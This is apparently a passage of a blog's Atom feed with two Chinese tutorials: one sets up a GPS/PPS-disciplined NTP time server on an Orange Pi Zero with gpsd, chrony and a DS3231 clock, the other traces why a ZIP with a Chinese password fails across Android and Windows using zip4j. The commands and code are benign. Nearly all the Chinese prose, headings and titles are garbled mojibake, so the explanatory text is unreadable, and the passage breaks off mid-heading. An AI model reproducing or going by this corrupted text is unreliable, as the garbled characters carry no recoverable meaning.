    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>é¦–å…ˆï¼šè¿™ä¸ªä¸œè¥¿æœ‰ä»€ä¹ˆç”¨ï¼Ÿ<br>ç­”ï¼š<strong>æ²¡æœ‰ä»»ä½•ç”¨å¤„ï¼Œä½†æ˜¯èƒ½è®©ä½ å†…ç½‘çš„è®¾å¤‡æ—¶é—´ç²¾åº¦è¾¾åˆ°äºšæ¯«ç§’çº§</strong>  </p><p><img src="/pictures/orangepi-zero-ntp/1.png" alt="time.is">  </p><p>å½“ç„¶ï¼Œä¸è¦ä»¥è¿™ä¸ªç½‘é¡µä¸ºå‚è€ƒï¼Œå®é™…è¯¯å·®è¦è¿œè¿œä½äºæ˜¾ç¤ºï¼š  </p><p><img src="/pictures/orangepi-zero-ntp/2.png" alt="chronyc sources">  </p><p>å®é™…åº”è¯¥æ˜¯å‡ ä¸ªå¾®ç§’çš„è¯¯å·®ã€‚  </p><hr><span id="more"></span> <h3 id="ææ–™å‡†å¤‡"><a href="#ææ–™å‡†å¤‡" class="headerlink" title="ææ–™å‡†å¤‡"></a>ææ–™å‡†å¤‡</h3><blockquote><ol><li>Orange Pi Zero LTS ä¸€ä¸ª<br> ä¹Ÿå°±æ˜¯åˆä»£çš„Orange Pi Zero</li><li>ATGM336H GPSæ¨¡å— ä¸€ä¸ª<br> å¯æ›¿æ¢ï¼Œåªè¦å¸¦PPSè¾“å‡ºçš„å°±è¡Œï¼Œæˆ‘é€‰è¿™ä¸ªå‹å·æ˜¯å› ä¸ºä»–æ˜¯ipexæ¥å£å¯ä»¥å¤–æ¥å¤©çº¿<br> 2.1 GPSå¤©çº¿(3.3vä¾›ç”µ) ä¸€ä¸ª<br> 2.2 SMAè½¬IPEXå°„é¢‘è½¬æ¥çº¿ ä¸€æ¡</li><li>DS3231 å®æ—¶æ—¶é’Ÿæ¨¡å— ä¸€ä¸ª<br> DS3231Mä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œåªæ˜¯ç”¨ä½œæ‰ç”µåçš„æ—¶é—´å¤‡ä»½ï¼Œç²¾åº¦ä¸å¤ªé‡è¦</li><li>2*13åŒæ’26P 2.54æœé‚¦æ’å¤´åŒæ’ç«¯å­çº¿ ä¸€ä¸ª<br> ç”¨äºä¼˜é›…çš„è¿æ¥åˆ°Orange Piçš„26P GPIOæ¥å£</li></ol></blockquote><p>å…¶ä»–ç”µå­é…ä»¶ä¸å†èµ˜è¿°  </p><h3 id="ç¡¬ä»¶é…ç½®"><a href="#ç¡¬ä»¶é…ç½®" class="headerlink" title="ç¡¬ä»¶é…ç½®"></a>ç¡¬ä»¶é…ç½®</h3><h4 id="GPSæ¨¡å—"><a href="#GPSæ¨¡å—" class="headerlink" title="GPSæ¨¡å—"></a>GPSæ¨¡å—</h4><p>ä½¿ç”¨USB-TTLæ¿å°†æ¨¡å—è¿æ¥åˆ°ç”µè„‘ï¼Œä½¿ç”¨å¯¹åº”çš„å·¥å…·å°†GPSæ¨¡å—çš„ä¸²å£æ³¢ç‰¹ç‡è°ƒæ•´åˆ°115200ï¼ˆæ¨¡å—ä¸€èˆ¬é»˜è®¤ä¸º9600ï¼Œè¿‡ä½ï¼Œæ—¶é—´æŠ¥æ–‡ä¼ è¾“æ—¶é—´å¤ªé•¿ï¼Œä¼šå¯¼è‡´å»¶è¿Ÿè¿‡é«˜ï¼‰<br>æˆ‘ä½¿ç”¨çš„ATGM336Hæ¨¡å—å¯ä»¥ç”¨GnssToolKit3è¿›è¡Œé…ç½® <a href="https://www.icofchina.com/xiazai/">https://www.icofchina.com/xiazai/</a><br>å…¶ä»–æ¨¡å—å¯ä»¥å‚è€ƒæ‰‹å†Œè¿›è¡Œé…ç½®  </p><h4 id="DS3231æ¨¡å—"><a href="#DS3231æ¨¡å—" class="headerlink" title="DS3231æ¨¡å—"></a>DS3231æ¨¡å—</h4><p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯åŒæ¬¾æ¨¡å—ï¼ˆå¤§æ¦‚ç‡ï¼‰ï¼Œä½¿ç”¨çƒ™é“æ‹†ç„Šæ‰è¿™é‡Œçš„ç”µé˜»ä»¥é˜²æ­¢VCCå€’çŒè¿›å…¥ç”µæ± <br><img src="/pictures/orangepi-zero-ntp/3.png" alt="DS3231">  </p><h4 id="æ¥çº¿å›¾"><a href="#æ¥çº¿å›¾" class="headerlink" title="æ¥çº¿å›¾"></a>æ¥çº¿å›¾</h4><p><img src="/pictures/orangepi-zero-ntp/4.png" alt="æ¥çº¿å›¾">  </p><h3 id="ç³»ç»Ÿé…ç½®"><a href="#ç³»ç»Ÿé…ç½®" class="headerlink" title="ç³»ç»Ÿé…ç½®"></a>ç³»ç»Ÿé…ç½®</h3><p>å‚è€ƒï¼š<a href="https://github.com/moonbuggy/Orange-Pi-Zero-GPS-NTP">https://github.com/moonbuggy/Orange-Pi-Zero-GPS-NTP</a><br>ä¸‹è½½å¯¹åº”çš„<a href="https://www.armbian.com/orange-pi-zero/">armbian</a>ç³»ç»Ÿå¹¶å°†ç³»ç»Ÿå®‰è£…åˆ°TFå¡<br>ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆåï¼Œä½¿ç”¨<code>armbian-config</code>å·¥å…·ï¼Œè¿›å…¥<code>System =&gt; Hardware</code>å¯ç”¨<code>i2c0, pps-gpio, uart2</code><br>è¿è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo &#x27;param_pps_pin=PA3&#x27; &gt;&gt; /boot/armbianEnv.txt&quot;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šPA3ä¸ºPPSè¾“å…¥<br>æ–°å»ºæ–‡ä»¶<code>ds3231.dts</code>:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">/dts-v1/;</span><br><span class="line">/plugin/;</span><br><span class="line"></span><br><span class="line">/ &#123;</span><br><span class="line">        compatible = &quot;xunlong,orangepi-zero&quot;, &quot;allwinner,sun8i-h2-plus&quot;;</span><br><span class="line"></span><br><span class="line">        fragment@0 &#123;</span><br><span class="line">                target-path = &quot;/aliases&quot;;</span><br><span class="line"></span><br><span class="line">                __overlay__ &#123;</span><br><span class="line">                        rtc0 = &quot;/soc/i2c@1c2b400/ds3231&quot;;</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        fragment@1 &#123;</span><br><span class="line">                target-path = &quot;/soc/i2c@1c2b400&quot;;</span><br><span class="line"></span><br><span class="line">                __overlay__ &#123;</span><br><span class="line">                        ds3231: rtc@68 &#123;</span><br><span class="line">                                compatible = &quot;maxim,ds3231&quot;;</span><br><span class="line">                                reg = &lt;0x68&gt;;</span><br><span class="line">                                #clock-cells = &lt;1&gt;;</span><br><span class="line">                        &#125;;</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘½ä»¤  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo armbian-add-overlay ds3231.dts</span><br></pre></td></tr></table></figure><p>å¯ç”¨DS3231çš„DTS</p><h3 id="è½¯ä»¶é…ç½®"><a href="#è½¯ä»¶é…ç½®" class="headerlink" title="è½¯ä»¶é…ç½®"></a>è½¯ä»¶é…ç½®</h3><h4 id="é…ç½®gpsd"><a href="#é…ç½®gpsd" class="headerlink" title="é…ç½®gpsd"></a>é…ç½®<code>gpsd</code></h4><p>å®‰è£…  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gpsd gpsd-tools pps-tools i2c-tools</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<code>/etc/default/gpsd</code>ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Devices gpsd should connect to at boot time.</span><br><span class="line"># They need to be read/writeable, either by user gpsd or the group dialout.</span><br><span class="line">DEVICES=&quot;/dev/ttyS2 /dev/pps0&quot;</span><br><span class="line"></span><br><span class="line"># Other options you want to pass to gpsd</span><br><span class="line">GPSD_OPTIONS=&quot;-n -s 115200&quot;</span><br><span class="line"></span><br><span class="line"># Automatically hot add/remove USB GPS devices via gpsdctl</span><br><span class="line">USBAUTO=&quot;true&quot;</span><br><span class="line"></span><br><span class="line">/bin/stty -F /dev/ttyS2 115200</span><br><span class="line">/bin/setserial /dev/ttyS2 low_latency</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘½ä»¤å¯åŠ¨<code>gpsd</code>æœåŠ¡ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl enable gpsd</span><br><span class="line">sudo systemctl start gpsd</span><br></pre></td></tr></table></figure><p>è¿è¡Œ<code>gpsmon</code>æŸ¥çœ‹æ˜¯å¦æœ‰è¾“å‡ºï¼Œå¦‚é…ç½®æ­£ç¡®åº”è¯¥å¯ä»¥çœ‹åˆ°NMEAæŠ¥æ–‡ï¼Œä½ç½®ï¼Œå«æ˜Ÿæ•°ç­‰ä¿¡æ¯<br>æ‰‹åŠ¨è°ƒæ•´å¤©çº¿çš„ä½ç½®ã€è§’åº¦ï¼Œå°½é‡é çª—ï¼Œè®©å¯è§å«æ˜Ÿæ•°å°½å¯èƒ½çš„å¤šï¼Œä½¿å®šä½è¯¯å·®å°½å¯èƒ½çš„å°<br><img src="/pictures/orangepi-zero-ntp/5.png" alt="gpsmon">  </p><h4 id="é…ç½®chrony"><a href="#é…ç½®chrony" class="headerlink" title="é…ç½®chrony"></a>é…ç½®<code>chrony</code></h4><p>å®‰è£…ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install chrony</span><br></pre></td></tr></table></figure><p>åˆ›å»ºé…ç½®æ–‡ä»¶<code>/etc/chrony/conf.d/gpsd.conf</code>ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">refclock SHM 0 precision 1e-1 offset 0.0 delay 0.2 refid NMEA noselect</span><br><span class="line">refclock PPS /dev/pps0 lock NMEA refid PPS maxlockage 32 prefer</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<code>/etc/default/chrony</code>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># This is a configuration file for /etc/init.d/chrony and</span><br><span class="line"># /lib/systemd/system/chrony.service; it allows you to pass various options to</span><br><span class="line"># the chrony daemon without editing the init script or service file.</span><br><span class="line"></span><br><span class="line"># Options to pass to chrony.</span><br><span class="line">DAEMON_OPTS=&quot;-F 1 -r -m -s&quot;</span><br></pre></td></tr></table></figure><p>é…ç½®DS3231ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># EÌ…OÌ…SÌ…CÌ…</span><br><span class="line">i2cset -y 0 0x68 0x0e 0x1c</span><br><span class="line"></span><br><span class="line"># OSF</span><br><span class="line">i2cset -y 0 0x68 0x0f 0x08</span><br><span class="line"></span><br><span class="line"># è®¾ç½®æ—¶é—´</span><br><span class="line">sudo hwclock -w -f /dev/rtc</span><br><span class="line"></span><br><span class="line"># è¯»å–æ—¶é—´</span><br><span class="line">sudo hwclock -r -f /dev/rtc</span><br></pre></td></tr></table></figure><h3 id="æ‚é¡¹ä¸å¾®è°ƒ"><a href="#æ‚é¡¹ä¸å¾®è°ƒ" class="headerlink" title="æ‚é¡¹ä¸å¾®è°ƒ"></a>æ‚é¡¹ä¸å¾®è°ƒ</h3><h4 id="é…ç½®ä¸Šæ¸¸NTP-server"><a href="#é…ç½®ä¸Šæ¸¸NTP-server" class="headerlink" title="é…ç½®ä¸Šæ¸¸NTP server"></a>é…ç½®ä¸Šæ¸¸NTP server</h4><p>ä½¿ç”¨å°±è¿‘çš„NTP server<br>å°†é…ç½®æ–‡ä»¶<code>/etc/chrony/chrony.conf</code>ä¸­åŸæ¥çš„pool&#x2F;serveréƒ¨åˆ†ä¿®æ”¹å¦‚ä¸‹ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server 0.cn.pool.ntp.org iburst</span><br><span class="line">server 1.cn.pool.ntp.org iburst</span><br><span class="line">server 2.cn.pool.ntp.org iburst</span><br><span class="line">server 3.cn.pool.ntp.org iburst</span><br></pre></td></tr></table></figure><h4 id="offsetæ•´å®š"><a href="#offsetæ•´å®š" class="headerlink" title="offsetæ•´å®š"></a>offsetæ•´å®š</h4><p>å‰æ–‡åœ¨é…ç½®æ–‡ä»¶<code>/etc/chrony/conf.d/gpsd.conf</code>ä¸­ï¼Œæš‚æ—¶å°†<code>offset</code>è®¾ç½®ä¸ºäº†<code>0.0</code>ï¼Œåœ¨chronyæœåŠ¡æ­£å¸¸è¿è¡ŒåŠå°æ—¶åï¼Œè¿è¡Œå‘½ä»¤ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chronyc sourcestats</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>NMEA</code>é¡¹çš„<code>Offset</code>éƒ¨åˆ†ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name/IP Address            NP  NR  Span  Frequency  Freq Skew  Offset  Std Dev</span><br><span class="line">==============================================================================</span><br><span class="line">NMEA                        7   3    95   -134.817    741.206  +4490us  9095us</span><br><span class="line">PPS                        39  26   608     -0.000      0.008     -1ns  2553ns</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å°†<code>Offset</code>çš„æ•°å€¼è½¬åŒ–ä¸ºç§’ï¼Œå¡«å…¥é…ç½®æ–‡ä»¶ä¸­ï¼Œé‡å¯chrony<br>æˆ‘çš„æ•°å€¼å·²ç»æ•´å®šè¿‡äº†ï¼Œæ‰€ä»¥åªæœ‰å‡ æ¯«ç§’ï¼Œæœªæ•´å®šæƒ…å†µä¸‹ä¸€èˆ¬ä¼šåœ¨Â±0.2ç§’ã€‚<br>offsetå€¼ä¸åº”è¶…è¿‡Â±0.45ç§’ã€‚</p><h4 id="å¼€å¯chronyçš„æœåŠ¡å™¨æ¨¡å¼"><a href="#å¼€å¯chronyçš„æœåŠ¡å™¨æ¨¡å¼" class="headerlink" title="å¼€å¯chronyçš„æœåŠ¡å™¨æ¨¡å¼"></a>å¼€å¯chronyçš„æœåŠ¡å™¨æ¨¡å¼</h4><p>åœ¨é…ç½®æ–‡ä»¶<code>/etc/chrony/chrony.conf</code>æœ«å°¾ï¼ŒåŠ ä¸€è¡Œï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow</span><br></pre></td></tr></table></figure><p>ç°åœ¨chronyå·²ç»å¯ä»¥è¢«å±€åŸŸç½‘å†…çš„è®¾å¤‡è®¿é—®åˆ°äº†ï¼Œå°†æœåŠ¡å™¨åœ°å€è®¾ä¸ºchronyçš„IPååŒæ­¥æ—¶é—´ï¼Œç„¶åå°±å¯ä»¥æˆªå›¾å»ç‚«è€€äº†ã€‚  </p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;é¦–å…ˆï¼šè¿™ä¸ªä¸œè¥¿æœ‰ä»€ä¹ˆç”¨ï¼Ÿ&lt;br&gt;ç­”ï¼š&lt;strong&gt;æ²¡æœ‰ä»»ä½•ç”¨å¤„ï¼Œä½†æ˜¯èƒ½è®©ä½ å†…ç½‘çš„è®¾å¤‡æ—¶é—´ç²¾åº¦è¾¾åˆ°äºšæ¯«ç§’çº§&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/pictures/orangepi-zero-ntp/1.png&quot; alt=&quot;time.is&quot;&gt;  &lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œä¸è¦ä»¥è¿™ä¸ªç½‘é¡µä¸ºå‚è€ƒï¼Œå®é™…è¯¯å·®è¦è¿œè¿œä½äºæ˜¾ç¤ºï¼š  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/pictures/orangepi-zero-ntp/2.png&quot; alt=&quot;chronyc sources&quot;&gt;  &lt;/p&gt;
&lt;p&gt;å®é™…åº”è¯¥æ˜¯å‡ ä¸ªå¾®ç§’çš„è¯¯å·®ã€‚  &lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>éš¾ç»·çš„Zipä¸ä¸­æ–‡å¯†ç </title>
    <link href="https://thinkalone.win/chinese-zip-password.html"/>
    <id>https://thinkalone.win/chinese-zip-password.html</id>
    <published>2024-03-01T04:00:00.000Z</published>
    <updated>2024-03-01T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h3><p><strong>æŸå¤©ï¼Œæˆ‘çš„æœ‹å‹åœ¨QQä¸Šè½¬å‘ç»™æˆ‘äº†ä¸€ä¸ªå¸¦å¯†ç çš„Zipå‹ç¼©åŒ…</strong><br><img src="/pictures/chinese-zip-password/1.png"></p><p>æˆ‘çœ‹äº†ä¸€çœ¼ï¼ŒåŒå‡»åé»˜è®¤ç”¨WinRARæ‰“å¼€äº†ï¼Œç„¶åå¤åˆ¶ç²˜è´´å¯†ç ï¼š<br><img src="/pictures/chinese-zip-password/2.png"></p><p>å•Šï¼Ÿå¯†ç é”™è¯¯ï¼Ÿ</p><hr><span id="more"></span> <p>æˆ‘ç¬¬ä¸€ååº”å½“ç„¶æ˜¯æ€€ç–‘æ˜¯ä¸æ˜¯å¯¹é¢å†²å¤šäº†æ‰‹æ»‘ï¼Œåœ¨è¾“å¯†ç çš„æ—¶å€™ä¸å°å¿ƒå¤šæ‰“äº†ç‚¹ä»€ä¹ˆè¿›å»ï¼Œä½†æ˜¯ç»è¿‡æˆ‘ä»¬10åˆ†é’Ÿçš„å‹å¥½äº¤æµåï¼Œä»–ç¡®å®šä»¥åŠè‚¯å®šè‡ªå·±ç»å¯¹æ²¡æœ‰æ‰‹æ»‘ï¼Œè¿˜æŠŠä¼ ç»™æˆ‘çš„å‹ç¼©åŒ…é‡æ–°ä¸‹è½½ä¸‹æ¥ <strong>åœ¨æ‰‹æœºä¸Š</strong> æŠŠå¯†ç ç²˜è´´è¿›å»æˆåŠŸè§£å‹äº†ã€‚</p><p>æˆ‘å½“æ—¶çœ‰å¤´ä¸€ç´§ï¼Œç«‹é©¬æ„Ÿè§‰åˆ°è‡ªå·±ä¼¼ä¹ç«™åˆ°äº†å‘çš„è¾¹ç¼˜ã€‚</p><h3 id="è¯•å›¾å¤ç°ï¼š"><a href="#è¯•å›¾å¤ç°ï¼š" class="headerlink" title="è¯•å›¾å¤ç°ï¼š"></a>è¯•å›¾å¤ç°ï¼š</h3><p>è¿™é‡Œä»¥æˆ‘å¸¸ç”¨çš„æ–‡ä»¶ç®¡ç†å™¨MiXplorerä¸ºä¾‹ï¼š<br>æ–°å»ºä¸€ä¸ªZipå‹ç¼©åŒ…ï¼Œå¯†ç è¿™é‡ŒMiXploreræ­£å¸¸æƒ…å†µä¸‹åªå…è®¸è¾“å…¥è‹±æ–‡+æ•°å­—ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠä¸­æ–‡å¯†ç ç²˜è´´è¿›å»ï¼š<br><img src="/pictures/chinese-zip-password/3.jpg"></p><p>ç„¶ååœ¨æ‰‹æœºä¸Šæµ‹è¯•è§£å‹ï¼š<br><img src="/pictures/chinese-zip-password/4.jpg"><br><img src="/pictures/chinese-zip-password/5.jpg"><br>æ˜¾ç„¶ï¼Œæ˜¯å¯ä»¥æ­£å¸¸è§£å‹çš„ï¼Œç„¶åæˆ‘ä»¬æŠŠè¿™ä¸ªå‹ç¼©åŒ…ä¼ åˆ°ç”µè„‘ä¸Š(Win10)å†æ¬¡è¿›è¡Œå°è¯•ï¼š<br><img src="/pictures/chinese-zip-password/6.png"><br><img src="/pictures/chinese-zip-password/7.png">  </p><h3 id="åŸå› åˆ†æï¼š"><a href="#åŸå› åˆ†æï¼š" class="headerlink" title="åŸå› åˆ†æï¼š"></a>åŸå› åˆ†æï¼š</h3><p>ä¸ç”¨å¤šæƒ³ï¼Œä¸€å®šæ˜¯ç¼–ç çš„é—®é¢˜ï¼Œä½†æˆ‘å¾ˆå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿä»¥åŠåŸæ¥çš„å¯†ç ç©¶ç«Ÿè¢«ç¼–ç æˆäº†ä»€ä¹ˆï¼Ÿ</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬Googleæœç´¢<code>java zip ä¸­æ–‡å¯†ç </code>ï¼Œé€šè¿‡æŸ¥æ‰¾å¯ä»¥å¾—çŸ¥ä¸€ä¸ªåŒ…ï¼š<a href="https://github.com/srikanth-lingala/zip4j">zip4j</a><br>ç„¶åæˆ‘ä»¬å†™ä¸€å°æ®µä»£ç æ¥è¯•ç€è§£å‹å®ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.lingala.zip4j.ZipFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnZip</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;æµ‹è¯•&quot;</span>;</span><br><span class="line"><span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(<span class="string">&quot;D:\\Work\\Temp\\chinese-zip-password\\27.zip&quot;</span>);</span><br><span class="line">zipFile.setPassword(password.toCharArray());</span><br><span class="line">zipFile.extractAll(<span class="string">&quot;D:\\Work\\Temp\\chinese-zip-password\\d&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œç›´æ¥æŠ¥é”™ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; net.lingala.zip4j.exception.ZipException: Wrong password!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœç´¢å¾—çŸ¥å®‰å“é»˜è®¤ä¸­æ–‡ç¼–ç æ˜¯UTF-8ï¼Œç„¶ååœ¨ç¿»é˜…zip4jçš„æ–‡æ¡£ï¼Œå¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæ–¹æ³•ï¼š<a href="https://javadoc.io/static/net.lingala.zip4j/zip4j/2.11.5/net/lingala/zip4j/ZipFile.html#setUseUtf8CharsetForPasswords(boolean)">setUseUtf8CharsetForPasswords</a> æˆ‘ä»¬ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.lingala.zip4j.ZipFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnZip</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;æµ‹è¯•&quot;</span>;</span><br><span class="line"><span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(<span class="string">&quot;D:\\Work\\Temp\\chinese-zip-password\\27.zip&quot;</span>);</span><br><span class="line">zipFile.setUseUtf8CharsetForPasswords(<span class="literal">false</span>);</span><br><span class="line">zipFile.setPassword(password.toCharArray());</span><br><span class="line">zipFile.extractAll(<span class="string">&quot;D:\\Work\\Temp\\chinese-zip-password\\d&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ¬¡èƒ½æˆåŠŸè¿è¡Œäº†ã€‚<br>è¿è¡Œæ˜¯æˆäº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆï¼Ÿé€šè¿‡æ–¹æ³•åæœç´¢æˆ‘ä»¬æ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªissueï¼š<a href="https://github.com/srikanth-lingala/zip4j/issues/328">https://github.com/srikanth-lingala/zip4j/issues/328</a>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Using non-ascii characters for passwords is in a grey zone as far as zip specification is concerned. Some tools convert passwords to utf8 and some don&#x27;t. With the change that you linked, zip4j converts the password to utf8 by default, and I guess Windows doesn&#x27;t, and that&#x27;s why it works fine in your case when you revert the utf8 conversion.</span><br><span class="line"></span><br><span class="line">I added an option to ZipFile api to use utf8 or not for password encoding and decoding. If you are sure that your zip file will only be used on windows, you can now generated the zip files by not using utf8. You can set this flag via ZipFile.setUseUtf8CharsetForPasswords(boolean).</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„æ€å¤§æ¦‚æ˜¯zip4jåœ¨é‡åˆ°ä¸­æ–‡å¯†ç çš„æ—¶å€™ä¼šå…ˆæŠŠå¯†ç è½¬UTF-8ï¼Œä½†æ˜¯windowsä¸ä¼šã€‚è¿™è§£å†³äº†æˆ‘ç¬¬ä¸€ä¸ªç–‘é—®ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç ”ç©¶ç¬¬äºŒä¸ªé—®é¢˜ï¼šåŸæ¥çš„å¯†ç ç©¶ç«Ÿè¢«ç¼–ç æˆäº†ä»€ä¹ˆï¼Ÿ  </p><h3 id="å¯†ç ä¾¿ä¹˜å˜æˆä»€ä¹ˆæ ·äº†ï¼Ÿ"><a href="#å¯†ç 